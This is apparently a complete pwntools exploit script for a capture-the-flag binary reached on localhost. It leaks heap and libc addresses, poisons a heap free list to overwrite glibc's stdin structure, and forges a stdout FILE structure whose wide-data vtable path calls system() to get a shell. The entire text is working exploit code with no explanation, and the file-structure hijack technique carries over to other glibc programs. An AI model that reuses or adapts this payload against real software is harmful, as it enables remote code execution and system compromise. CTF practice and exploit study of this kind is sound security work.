from pwn import *
context.binary = exe = ELF("./chall")
libc = ELF('./libc.so.6')

r = remote("localhost", 5000)
r.sendline(b'01')
r.recvuntil(b'Result = ')
r.sendline((b'0'*0x10 + b'1*')*2 + b'01')
r.recvuntil(b'Result = ')
leak = int(r.recvline())
heap_base = ((leak & ((1<<64) - 1)) << 12) - 0x13000
print(hex(heap_base))
print(hex(leak))
r.sendline(b'reset')
for i in range(0x1000//0x10 - 3):
    r.sendline('00' + str(i))
r.clean()
r.sendline((b'0'*0x10 + b'1*')*9 + b'00' + str(0x1b).encode())
r.recvuntil(b'Result = ')
libc.address = (int(r.recvline()) & ((1<<64) - 1)) + 0x7f7e0ef4d000 - 0x7f7e0f151130
print(hex(libc.address))
r.sendline(b'reset')

r.sendline(b'0'*0x100)

r.sendline(b'reset')
print(str((leak& ~((1 << 64) - 1))))
r.sendline('0'*0x10 + str((leak& ~((1 << 64) - 1)) +  (((heap_base + 0x16ff0)>>12) ^ (libc.symbols['_IO_2_1_stdin_'] + 0x40)) ) + '+0')

r.sendline(b'a'*0x10)

r.sendline(p64(libc.symbols['_IO_2_1_stdin_'] + 0xffffff) + p64(0))
input()
def brother_may_I_have_some_oats(fp_addr):
    fp = FileStructure(null=fp_addr+0x68)
    fp.flags = 0x687320
    fp._IO_read_ptr = 0x0
    fp._IO_write_base = 0x0
    fp._IO_write_ptr = 0x1
    fp._wide_data = fp_addr-0x10
    payload = bytes(fp)
    payload = payload[:0xc8] + p64(libc.sym['system']) + p64(fp_addr + 0x60)
    payload += p64(libc.sym['_IO_wfile_jumps'])
    return payload

stdin_lock = libc.sym['_IO_stdfile_0_lock']
stdin_wide_data = libc.sym['_IO_wide_data_0']
mode = 0xffffffff # 32-bit integer

stdin_payload = b''
stdin_payload += b'quit\n' # _shortbuf
stdin_payload += p64(stdin_lock) # _lock
stdin_payload += p64(0xffffffffffffffff) # _offset
stdin_payload += p64(0) # _codecvt
stdin_payload += p64(stdin_wide_data) # _wide_data
stdin_payload += p64(0) # _freeres_list
stdin_payload += p64(0) # _freeres_buf
stdin_payload += p64(0) # __pad5
stdin_payload += p32(mode) # _mode
stdin_payload += b'\0' * 0x14 # _unused2
stdin_payload += p64(libc.sym['_IO_file_jumps']) # vtable

in_between = flat({}, length=0xc00)

stdout_payload = brother_may_I_have_some_oats(libc.sym['_IO_2_1_stdout_'])

r.send(stdin_payload + in_between + stdout_payload)

r.interactive()